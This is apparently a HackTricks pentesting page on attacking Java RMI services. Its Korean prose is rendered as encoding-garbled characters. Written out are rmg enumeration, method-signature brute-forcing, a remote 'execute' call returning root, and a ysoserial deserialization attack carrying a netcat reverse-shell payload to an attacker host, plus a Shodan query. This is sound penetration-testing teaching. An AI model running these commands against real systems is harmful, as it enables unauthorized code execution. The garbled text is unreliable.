# 1098/1099/1050 - Pentesting Java RMI - RMI-IIOP

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ì—ì„œ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¸ê³„ì—ì„œ ê°€ì¥ **ê³ ê¸‰ ì»¤ë®¤ë‹ˆí‹° ë„êµ¬**ë¥¼ í™œìš©í•œ **ì›Œí¬í”Œë¡œìš°ë¥¼ ì‰½ê²Œ êµ¬ì¶•í•˜ê³  ìë™í™”**í•˜ì„¸ìš”.\
ì˜¤ëŠ˜ ë°”ë¡œ ì•¡ì„¸ìŠ¤í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## ê¸°ë³¸ ì •ë³´

_Java Remote Method Invocation_ ë˜ëŠ” _Java RMI_ëŠ” ê°ì²´ ì§€í–¥ _RPC_ ë©”ì»¤ë‹ˆì¦˜ìœ¼ë¡œ, í•œ _Java ê°€ìƒ ë¨¸ì‹ _ì— ìˆëŠ” ê°ì²´ê°€ ë‹¤ë¥¸ _Java ê°€ìƒ ë¨¸ì‹ _ì— ìˆëŠ” ê°ì²´ì˜ ë©”ì„œë“œë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê°œë°œìëŠ” ê°ì²´ ì§€í–¥ íŒ¨ëŸ¬ë‹¤ì„ì„ ì‚¬ìš©í•˜ì—¬ ë¶„ì‚° ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì‘ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê³µê²©ì ì¸ ê´€ì ì—ì„œì˜ _Java RMI_ì— ëŒ€í•œ ê°„ë‹¨í•œ ì†Œê°œëŠ” [ì´ ë¸”ë™í–‡ í† í¬](https://youtu.be/t\_aw1mDNhzI?t=202)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ê¸°ë³¸ í¬íŠ¸:** 1090,1098,1099,1199,4443-4446,8999-9010,9999
```
PORT      STATE SERVICE      VERSION
1090/tcp  open  ssl/java-rmi Java RMI
9010/tcp  open  java-rmi     Java RMI
37471/tcp open  java-rmi     Java RMI
40259/tcp open  ssl/java-rmi Java RMI
```
ì¼ë°˜ì ìœ¼ë¡œ, ê¸°ë³¸ _Java RMI_ êµ¬ì„± ìš”ì†Œ (_RMI Registry_ ë° _Activation System_)ë§Œ ì¼ë°˜ í¬íŠ¸ì— ë°”ì¸ë”©ë©ë‹ˆë‹¤. ì‹¤ì œ _RMI_ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ êµ¬í˜„í•˜ëŠ” _ì›ê²© ê°ì²´_ëŠ” ì¼ë°˜ì ìœ¼ë¡œ ìœ„ì˜ ì¶œë ¥ê³¼ ê°™ì´ ì„ì˜ì˜ í¬íŠ¸ì— ë°”ì¸ë”©ë©ë‹ˆë‹¤.

_nmap_ì€ ë•Œë•Œë¡œ _SSL_ë¡œ ë³´í˜¸ëœ _RMI_ ì„œë¹„ìŠ¤ë¥¼ ì‹ë³„í•˜ëŠ” ë° ì–´ë ¤ì›€ì„ ê²ªì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¼ë°˜ _RMI_ í¬íŠ¸ì—ì„œ ì•Œ ìˆ˜ ì—†ëŠ” ssl ì„œë¹„ìŠ¤ë¥¼ ë§Œë‚˜ë©´ ì¶”ê°€ ì¡°ì‚¬ê°€ í•„ìš”í•©ë‹ˆë‹¤.

## RMI êµ¬ì„± ìš”ì†Œ

ê°„ë‹¨íˆ ë§í•´ì„œ, _Java RMI_ëŠ” ê°œë°œìê°€ ë„¤íŠ¸ì›Œí¬ì—ì„œ _Java ê°ì²´_ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. ì´ëŠ” í´ë¼ì´ì–¸íŠ¸ê°€ í•´ë‹¹ ê°ì²´ì— ì—°ê²°í•˜ê³  ë©”ì„œë“œë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆëŠ” _TCP_ í¬íŠ¸ë¥¼ ì—½ë‹ˆë‹¤. ì´ê²ƒì€ ê°„ë‹¨í•´ ë³´ì´ì§€ë§Œ, _Java RMI_ê°€ í•´ê²°í•´ì•¼ í•  ì—¬ëŸ¬ ê°€ì§€ ë„ì „ ê³¼ì œê°€ ìˆìŠµë‹ˆë‹¤:

1. _Java RMI_ë¥¼ í†µí•´ ë©”ì„œë“œ í˜¸ì¶œì„ ë””ìŠ¤íŒ¨ì¹˜í•˜ë ¤ë©´ í´ë¼ì´ì–¸íŠ¸ê°€ ëŒ€ìƒ ê°ì²´ì˜ IP ì£¼ì†Œ, ìˆ˜ì‹  í¬íŠ¸, êµ¬í˜„ëœ í´ë˜ìŠ¤ ë˜ëŠ” ì¸í„°í˜ì´ìŠ¤, ëŒ€ìƒ ê°ì²´ì˜ `ObjID` (ëŒ€ìƒ ê°ì²´ê°€ ë„¤íŠ¸ì›Œí¬ì—ì„œ ì‚¬ìš© ê°€ëŠ¥í•´ì§ˆ ë•Œ ìƒì„±ë˜ëŠ” ê³ ìœ í•œ ë¬´ì‘ìœ„ ì‹ë³„ì)ë¥¼ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤. ì´ëŠ” _Java RMI_ê°€ ì—¬ëŸ¬ ê°ì²´ê°€ ë™ì¼í•œ _TCP_ í¬íŠ¸ì—ì„œ ìˆ˜ì‹ í•  ìˆ˜ ìˆë„ë¡ í—ˆìš©í•˜ê¸° ë•Œë¬¸ì— í•„ìš”í•©ë‹ˆë‹¤.
2. ì›ê²© í´ë¼ì´ì–¸íŠ¸ëŠ” ë…¸ì¶œëœ ê°ì²´ì˜ ë©”ì„œë“œë¥¼ í˜¸ì¶œí•˜ì—¬ ì„œë²„ì— ë¦¬ì†ŒìŠ¤ë¥¼ í• ë‹¹í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. _Java ê°€ìƒ ë¨¸ì‹ _ì€ ì´ëŸ¬í•œ ë¦¬ì†ŒìŠ¤ ì¤‘ ì‚¬ìš© ì¤‘ì¸ ë¦¬ì†ŒìŠ¤ì™€ ê°€ë¹„ì§€ ì»¬ë ‰ì…˜í•  ìˆ˜ ìˆëŠ” ë¦¬ì†ŒìŠ¤ë¥¼ ì¶”ì í•´ì•¼ í•©ë‹ˆë‹¤.

ì²« ë²ˆì§¸ ë„ì „ ê³¼ì œëŠ” _RMI ë ˆì§€ìŠ¤íŠ¸ë¦¬_ì— ì˜í•´ í•´ê²°ë©ë‹ˆë‹¤. _RMI ë ˆì§€ìŠ¤íŠ¸ë¦¬_ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ _Java RMI_ë¥¼ ìœ„í•œ ë„¤ì´ë° ì„œë¹„ìŠ¤ì…ë‹ˆë‹¤. _RMI ë ˆì§€ìŠ¤íŠ¸ë¦¬_ ìì²´ë„ _RMI ì„œë¹„ìŠ¤_ì´ì§€ë§Œ, êµ¬í˜„ëœ ì¸í„°í˜ì´ìŠ¤ì™€ `ObjID`ëŠ” ê³ ì •ë˜ì–´ ìˆìœ¼ë©° ëª¨ë“  _RMI_ í´ë¼ì´ì–¸íŠ¸ê°€ ì•Œê³  ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ _RMI_ í´ë¼ì´ì–¸íŠ¸ëŠ” í•´ë‹¹ _TCP_ í¬íŠ¸ë¥¼ ì•Œê³  ìˆê¸°ë§Œ í•˜ë©´ _RMI_ ë ˆì§€ìŠ¤íŠ¸ë¦¬ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê°œë°œìê°€ ë„¤íŠ¸ì›Œí¬ì—ì„œ ìì‹ ì˜ _Java ê°ì²´_ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œ í•˜ë ¤ë©´ ì¼ë°˜ì ìœ¼ë¡œ ì´ë¥¼ _RMI ë ˆì§€ìŠ¤íŠ¸ë¦¬_ì— ë°”ì¸ë”©í•©ë‹ˆë‹¤. _ë ˆì§€ìŠ¤íŠ¸ë¦¬_ëŠ” ê°ì²´ì— ì—°ê²°í•˜ê¸° ìœ„í•´ í•„ìš”í•œ ëª¨ë“  ì •ë³´ (IP ì£¼ì†Œ, ìˆ˜ì‹  í¬íŠ¸, êµ¬í˜„ëœ í´ë˜ìŠ¤ ë˜ëŠ” ì¸í„°í˜ì´ìŠ¤, `ObjID` ê°’)ë¥¼ ì €ì¥í•˜ê³  ì¸ê°„ì´ ì½ì„ ìˆ˜ ìˆëŠ” ì´ë¦„ (ë°”ì¸ë”©ëœ ì´ë¦„)ìœ¼ë¡œ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. _RMI ì„œë¹„ìŠ¤_ë¥¼ ì‚¬ìš©í•˜ë ¤ëŠ” í´ë¼ì´ì–¸íŠ¸ëŠ” _RMI ë ˆì§€ìŠ¤íŠ¸ë¦¬_ì— í•´ë‹¹ _ë°”ì¸ë”©ëœ ì´ë¦„_ì„ ìš”ì²­í•˜ê³  ë ˆì§€ìŠ¤íŠ¸ë¦¬ëŠ” ì—°ê²°ì— í•„ìš”í•œ ëª¨ë“  ì •ë³´ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ìƒí™©ì€ ì¼ë°˜ì ì¸ _DNS_ ì„œë¹„ìŠ¤ì™€ ë™ì¼í•©ë‹ˆë‹¤. ë‹¤ìŒ ëª©ë¡ì€ ì‘ì€ ì˜ˆì œë¥¼ ë³´ì—¬ì¤ë‹ˆë‹¤:
```java
import java.rmi.registry.Registry;
import java.rmi.registry.LocateRegistry;
import lab.example.rmi.interfaces.RemoteService;

public class ExampleClient {

private static final String remoteHost = "172.17.0.2";
private static final String boundName = "remote-service";

public static void main(String[] args)
{
try {
Registry registry = LocateRegistry.getRegistry(remoteHost);     // Connect to the RMI registry
RemoteService ref = (RemoteService)registry.lookup(boundName);  // Lookup the desired bound name
String response = ref.remoteMethod();                           // Call a remote method

} catch( Exception e) {
e.printStackTrace();
}
}
}
```
ìœ„ì—ì„œ ì–¸ê¸‰í•œ ë„ì „ ê³¼ì œ ì¤‘ ë‘ ë²ˆì§¸ëŠ” _ë¶„ì‚° ê°€ë¹„ì§€ ìˆ˜ì§‘ê¸°_ (_DGC_)ë¡œ í•´ê²°ë©ë‹ˆë‹¤. ì´ëŠ” ì˜ ì•Œë ¤ì§„ `ObjID` ê°’ì´ ìˆëŠ” ë˜ ë‹¤ë¥¸ _RMI ì„œë¹„ìŠ¤_ì´ë©°, ê¸°ë³¸ì ìœ¼ë¡œ ê° _RMI ì—”ë“œí¬ì¸íŠ¸_ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. _RMI í´ë¼ì´ì–¸íŠ¸_ê°€ _RMI ì„œë¹„ìŠ¤_ë¥¼ ì‚¬ìš©í•˜ê¸° ì‹œì‘í•˜ë©´, í•´ë‹¹ _ì›ê²© ê°ì²´_ê°€ ì‚¬ìš© ì¤‘ì„ì„ _DGC_ì—ê²Œ ì•Œë¦½ë‹ˆë‹¤. _DGC_ëŠ” ì°¸ì¡° ì¹´ìš´íŠ¸ë¥¼ ì¶”ì í•˜ê³  ì‚¬ìš©ë˜ì§€ ì•ŠëŠ” ê°ì²´ë¥¼ ì •ë¦¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ì™€ í•¨ê»˜ íê¸°ëœ _Activation System_ê³¼ í•¨ê»˜, ì´ê²ƒë“¤ì€ _Java RMI_ì˜ ì„¸ ê°€ì§€ ê¸°ë³¸ êµ¬ì„± ìš”ì†Œì…ë‹ˆë‹¤:

1. _RMI ë ˆì§€ìŠ¤íŠ¸ë¦¬_ (`ObjID = 0`)
2. _Activation System_ (`ObjID = 1`)
3. _ë¶„ì‚° ê°€ë¹„ì§€ ìˆ˜ì§‘ê¸°_ (`ObjID = 2`)

ê¸°ë³¸ _Java RMI_ êµ¬ì„± ìš”ì†ŒëŠ” ì˜¤ë˜ëœ _Java_ ë²„ì „ì—ì„œ ì—¬ëŸ¬ ì·¨ì•½ì ì´ ì¡´ì¬í•˜ì—¬ ì•Œë ¤ì§„ ê³µê²© ê²½ë¡œì…ë‹ˆë‹¤. ê³µê²©ìì˜ ê´€ì ì—ì„œ ì´ëŸ¬í•œ ê¸°ë³¸ êµ¬ì„± ìš”ì†ŒëŠ” ì•Œë ¤ì§„ í´ë˜ìŠ¤/ì¸í„°í˜ì´ìŠ¤ë¥¼ êµ¬í˜„í•˜ê³  ìˆìœ¼ë©° ì‰½ê²Œ ìƒí˜¸ ì‘ìš©í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— í¥ë¯¸ë¡œìš´ ëŒ€ìƒì…ë‹ˆë‹¤. ì´ ìƒí™©ì€ ì‚¬ìš©ì ì •ì˜ _RMI ì„œë¹„ìŠ¤_ì— ëŒ€í•´ì„œëŠ” ë‹¤ë¦…ë‹ˆë‹¤. _ì›ê²© ê°ì²´_ì˜ ë©”ì„œë“œë¥¼ í˜¸ì¶œí•˜ë ¤ë©´ ë¯¸ë¦¬ í•´ë‹¹ ë©”ì„œë“œ ì‹œê·¸ë‹ˆì²˜ë¥¼ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤. ê¸°ì¡´ ë©”ì„œë“œ ì‹œê·¸ë‹ˆì²˜ë¥¼ ì•Œì§€ ëª»í•˜ë©´ _RMI ì„œë¹„ìŠ¤_ì™€ í†µì‹ í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.

## RMI ì—´ê±°

[remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)ëŠ” ì¼ë°˜ì ì¸ _RMI ì·¨ì•½ì _ì„ ìë™ìœ¼ë¡œ ì‹ë³„í•  ìˆ˜ ìˆëŠ” _Java RMI_ ì·¨ì•½ì  ìŠ¤ìºë„ˆì…ë‹ˆë‹¤. _RMI_ ì—”ë“œí¬ì¸íŠ¸ë¥¼ ì‹ë³„í•˜ë©´ ì´ë¥¼ ì‹œë„í•´ ë³´ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤:
```
$ rmg enum 172.17.0.2 9010
[+] RMI registry bound names:
[+]
[+] 	- plain-server2
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 		    Endpoint: iinsecure.dev:37471  TLS: no  ObjID: [55ff5a5d:17e0501b054:-7ff7, 3638117546492248534]
[+] 	- legacy-service
[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
[+] 		    Endpoint: iinsecure.dev:37471  TLS: no  ObjID: [55ff5a5d:17e0501b054:-7ffc, 708796783031663206]
[+] 	- plain-server
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 		    Endpoint: iinsecure.dev:37471  TLS: no  ObjID: [55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]
[+]
[+] RMI server codebase enumeration:
[+]
[+] 	- http://iinsecure.dev/well-hidden-development-folder/
[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer
[+]
[+] RMI server String unmarshalling enumeration:
[+]
[+] 	- Caught ClassNotFoundException during lookup call.
[+] 	  --> The type java.lang.String is unmarshalled via readObject().
[+] 	  Configuration Status: Outdated
[+]
[+] RMI server useCodebaseOnly enumeration:
[+]
[+] 	- Caught MalformedURLException during lookup call.
[+] 	  --> The server attempted to parse the provided codebase (useCodebaseOnly=false).
[+] 	  Configuration Status: Non Default
[+]
[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
[+]
[+] 	- Caught NotBoundException during unbind call (unbind was accepeted).
[+] 	  Vulnerability Status: Vulnerable
[+]
[+] RMI Security Manager enumeration:
[+]
[+] 	- Security Manager rejected access to the class loader.
[+] 	  --> The server does use a Security Manager.
[+] 	  Configuration Status: Current Default
[+]
[+] RMI server JEP290 enumeration:
[+]
[+] 	- DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
[+] 	  Vulnerability Status: Non Vulnerable
[+]
[+] RMI registry JEP290 bypass enmeration:
[+]
[+] 	- Caught IllegalArgumentException after sending An Trinh gadget.
[+] 	  Vulnerability Status: Vulnerable
[+]
[+] RMI ActivationSystem enumeration:
[+]
[+] 	- Caught IllegalArgumentException during activate call (activator is present).
[+] 	  --> Deserialization allowed	 - Vulnerability Status: Vulnerable
[+] 	  --> Client codebase enabled	 - Configuration Status: Non Default
```
ì—´ê±° ì‘ì—…ì˜ ì¶œë ¥ì€ í”„ë¡œì íŠ¸ì˜ [ë¬¸ì„œ í˜ì´ì§€](https://github.com/qtc-de/remote-method-guesser/blob/master/docs/rmg/actions.md#enum-action)ì—ì„œ ìì„¸íˆ ì„¤ëª…ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ê²°ê³¼ì— ë”°ë¼ í™•ì¸ëœ ì·¨ì•½ì ì„ ê²€ì¦í•´ì•¼ í•©ë‹ˆë‹¤.

_remote-method-guesser_ì—ì„œ í‘œì‹œëœ `ObjID` ê°’ì€ ì„œë¹„ìŠ¤ì˜ ê°€ë™ ì‹œê°„ì„ í™•ì¸í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ë‹¤ë¥¸ ì·¨ì•½ì ì„ ì‹ë³„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
$ rmg objid '[55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]'
[+] Details for ObjID [55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]
[+]
[+] ObjNum: 		-4004948013687638236
[+] UID:
[+] 	Unique: 	1442798173
[+] 	Time: 		1640761503828 (Dec 29,2021 08:05)
[+] 	Count: 		-32760
```
## ì›ê²© ë©”ì„œë“œ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©

ì—´ê±° ê³¼ì •ì—ì„œ ì·¨ì•½ì ì„ ì°¾ì§€ ëª»í–ˆë”ë¼ë„ ì‚¬ìš© ê°€ëŠ¥í•œ _RMI_ ì„œë¹„ìŠ¤ëŠ” ì—¬ì „íˆ ìœ„í—˜í•œ ê¸°ëŠ¥ì„ ë…¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ, _RMI_ ê¸°ë³¸ êµ¬ì„± ìš”ì†Œì™€ì˜ _RMI_ í†µì‹ ì€ ì—­ì§ë ¬í™” í•„í„°ë¡œ ë³´í˜¸ë˜ì§€ë§Œ, ì‚¬ìš©ì ì •ì˜ _RMI_ ì„œë¹„ìŠ¤ì™€ì˜ í†µì‹ ì—ì„œëŠ” ì´ëŸ¬í•œ í•„í„°ê°€ ì¼ë°˜ì ìœ¼ë¡œ ì ìš©ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë”°ë¼ì„œ _RMI_ ì„œë¹„ìŠ¤ì—ì„œ ìœ íš¨í•œ ë©”ì„œë“œ ì‹œê·¸ë‹ˆì²˜ë¥¼ ì•Œì•„ë‚´ëŠ” ê²ƒì€ ê°€ì¹˜ê°€ ìˆìŠµë‹ˆë‹¤.

ë¶ˆí–‰íˆë„, _Java RMI_ëŠ” _ì›ê²© ê°ì²´_ì˜ ë©”ì„œë“œë¥¼ ì—´ê±°í•˜ëŠ” ê²ƒì„ ì§€ì›í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ê·¸ëŸ¼ì—ë„ ë¶ˆêµ¬í•˜ê³ , [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) ë˜ëŠ” [rmiscout](https://github.com/BishopFox/rmiscout)ê³¼ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ë©”ì„œë“œ ì‹œê·¸ë‹ˆì²˜ë¥¼ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
$ rmg guess 172.17.0.2 9010
[+] Reading method candidates from internal wordlist rmg.txt
[+] 	752 methods were successfully parsed.
[+] Reading method candidates from internal wordlist rmiscout.txt
[+] 	2550 methods were successfully parsed.
[+]
[+] Starting Method Guessing on 3281 method signature(s).
[+]
[+] 	MethodGuesser is running:
[+] 		--------------------------------
[+] 		[ plain-server2  ] HIT! Method with signature String execute(String dummy) exists!
[+] 		[ plain-server2  ] HIT! Method with signature String system(String dummy, String[] dummy2) exists!
[+] 		[ legacy-service ] HIT! Method with signature void logMessage(int dummy1, String dummy2) exists!
[+] 		[ legacy-service ] HIT! Method with signature void releaseRecord(int recordID, String tableName, Integer remoteHashCode) exists!
[+] 		[ legacy-service ] HIT! Method with signature String login(java.util.HashMap dummy1) exists!
[+] 		[6562 / 6562] [#####################################] 100%
[+] 	done.
[+]
[+] Listing successfully guessed methods:
[+]
[+] 	- plain-server2 == plain-server
[+] 		--> String execute(String dummy)
[+] 		--> String system(String dummy, String[] dummy2)
[+] 	- legacy-service
[+] 		--> void logMessage(int dummy1, String dummy2)
[+] 		--> void releaseRecord(int recordID, String tableName, Integer remoteHashCode)
[+] 		--> String login(java.util.HashMap dummy1)
```
ë‹¤ìŒê³¼ ê°™ì´ ì‹ë³„ëœ ë©”ì„œë“œë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
$ rmg call 172.17.0.2 9010 '"id"' --bound-name plain-server --signature "String execute(String dummy)" --plugin GenericPrint.jar
[+] uid=0(root) gid=0(root) groups=0(root)
```
ë˜ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ì—­ì§ë ¬í™” ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
$ rmg serial 172.17.0.2 9010 CommonsCollections6 'nc 172.17.0.1 4444 -e ash' --bound-name plain-server --signature "String execute(String dummy)"
[+] Creating ysoserial payload... done.
[+]
[+] Attempting deserialization attack on RMI endpoint...
[+]
[+] 	Using non primitive argument type java.lang.String on position 0
[+] 	Specified method signature is String execute(String dummy)
[+]
[+] 	Caught ClassNotFoundException during deserialization attack.
[+] 	Server attempted to deserialize canary class 6ac727def61a4800a09987c24352d7ea.
[+] 	Deserialization attack probably worked :)

$ nc -vlp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:45479.
id
uid=0(root) gid=0(root) groups=0(root)
```
ë‹¤ìŒì€ ì´ëŸ¬í•œ ê¸°ì‚¬ì—ì„œ ë” ë§ì€ ì •ë³´ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* [JEP 290 ì´í›„ Java RMI ì„œë¹„ìŠ¤ ê³µê²©](https://mogwailabs.de/de/blog/2019/03/attacking-java-rmi-services-after-jep-290/)
* [ë©”ì†Œë“œ ì¶”ì¸¡](https://github.com/qtc-de/remote-method-guesser/blob/master/docs/rmg/method-guessing.md)
* [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)
* [rmiscout](https://bishopfox.com/blog/rmiscout)

ì¶”ì¸¡ ì™¸ì—ë„, _RMI_ ì„œë¹„ìŠ¤ë¥¼ ì°¾ì€ ê²½ìš°ì—ëŠ” ê²€ìƒ‰ ì—”ì§„ì´ë‚˜ _GitHub_ì—ì„œ ì¸í„°í˜ì´ìŠ¤ë‚˜ ì‹¬ì§€ì–´ êµ¬í˜„ì„ ì°¾ì•„ë³´ëŠ” ê²ƒë„ ì¢‹ìŠµë‹ˆë‹¤. ì—¬ê¸°ì—ì„œ _bound name_ê³¼ êµ¬í˜„ëœ í´ë˜ìŠ¤ ë˜ëŠ” ì¸í„°í˜ì´ìŠ¤ì˜ ì´ë¦„ì´ ë„ì›€ì´ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ì•Œë ¤ì§„ ì¸í„°í˜ì´ìŠ¤

[remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)ëŠ” ë„êµ¬ì˜ ë‚´ë¶€ ë°ì´í„°ë² ì´ìŠ¤ì— ìˆëŠ” ì•Œë ¤ì§„ _RMI ì„œë¹„ìŠ¤_ ëª©ë¡ì— ë‚˜ì—´ëœ í´ë˜ìŠ¤ë‚˜ ì¸í„°í˜ì´ìŠ¤ë¥¼ `known`ìœ¼ë¡œ í‘œì‹œí•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ê²½ìš° `known` ë™ì‘ì„ ì‚¬ìš©í•˜ì—¬ í•´ë‹¹ _RMI ì„œë¹„ìŠ¤_ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
$ rmg enum 172.17.0.2 1090 | head -n 5
[+] RMI registry bound names:
[+]
[+] 	- jmxrmi
[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class: JMX Server)
[+] 		    Endpoint: localhost:41695  TLS: no  ObjID: [7e384a4f:17e0546f16f:-7ffe, -553451807350957585]

$ rmg known javax.management.remote.rmi.RMIServerImpl_Stub
[+] Name:
[+] 	JMX Server
[+]
[+] Class Name:
[+] 	- javax.management.remote.rmi.RMIServerImpl_Stub
[+] 	- javax.management.remote.rmi.RMIServer
[+]
[+] Description:
[+] 	Java Management Extensions (JMX) can be used to monitor and manage a running Java virtual machine.
[+] 	This remote object is the entrypoint for initiating a JMX connection. Clients call the newClient
[+] 	method usually passing a HashMap that contains connection options (e.g. credentials). The return
[+] 	value (RMIConnection object) is another remote object that is when used to perform JMX related
[+] 	actions. JMX uses the randomly assigned ObjID of the RMIConnection object as a session id.
[+]
[+] Remote Methods:
[+] 	- String getVersion()
[+] 	- javax.management.remote.rmi.RMIConnection newClient(Object params)
[+]
[+] References:
[+] 	- https://docs.oracle.com/javase/8/docs/technotes/guides/management/agent.html
[+] 	- https://github.com/openjdk/jdk/tree/master/src/java.management.rmi/share/classes/javax/management/remote/rmi
[+]
[+] Vulnerabilities:
[+]
[+] 	-----------------------------------
[+] 	Name:
[+] 		MLet
[+]
[+] 	Description:
[+] 		MLet is the name of an MBean that is usually available on JMX servers. It can be used to load
[+] 		other MBeans dynamically from user specified codebase locations (URLs). Access to the MLet MBean
[+] 		is therefore most of the time equivalent to remote code execution.
[+]
[+] 	References:
[+] 		- https://github.com/qtc-de/beanshooter
[+]
[+] 	-----------------------------------
[+] 	Name:
[+] 		Deserialization
[+]
[+] 	Description:
[+] 		Before CVE-2016-3427 got resolved, JMX accepted arbitrary objects during a call to the newClient
[+] 		method, resulting in insecure deserialization of untrusted objects. Despite being fixed, the
[+] 		actual JMX communication using the RMIConnection object is not filtered. Therefore, if you can
[+] 		establish a working JMX connection, you can also perform deserialization attacks.
[+]
[+] 	References:
[+] 		- https://github.com/qtc-de/beanshooter
```
## Shodan

* `port:1099 java`

## ë„êµ¬

* [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)
* [rmiscout](https://github.com/BishopFox/rmiscout)
* [BaRMIe](https://github.com/NickstaDB/BaRMIe)

## ì°¸ê³  ìë£Œ
* [https://github.com/qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

## HackTricks ìë™ ëª…ë ¹ì–´
```
Protocol_Name: Java RMI                                        #Protocol Abbreviation if there is one.
Port_Number:  1090,1098,1099,1199,4443-4446,8999-9010,9999     #Comma separated if there is more than one.
Protocol_Description: Java Remote Method Invocation            #Protocol Abbreviation Spelled out

Entry_1:
Name: Enumeration
Description: Perform basic enumeration of an RMI service
Command: rmg enum {IP} {PORT}
```
